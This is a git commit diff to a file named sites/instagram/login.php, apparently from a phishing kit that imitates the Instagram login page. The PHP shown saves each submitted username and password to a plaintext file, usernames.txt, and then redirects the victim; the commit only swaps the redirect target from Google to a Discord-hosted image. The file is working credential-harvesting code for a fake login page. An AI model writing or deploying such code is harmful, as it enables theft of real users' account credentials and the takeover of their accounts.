b962431584b268727632f9aa109380b3337c70ed
Fran0987 <70840620+Fran0987@users.noreply.github.com>
2020-09-06 20:21:15 -0300

    Update login.php

--- sites/instagram/login.php
+++ sites/instagram/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.google.com');
+header('Location: https://cdn.discordapp.com/attachments/748753299112722432/752307344968515694/5c3b5fdbf8339e233677cdd594ab2801.jpg');
 exit();
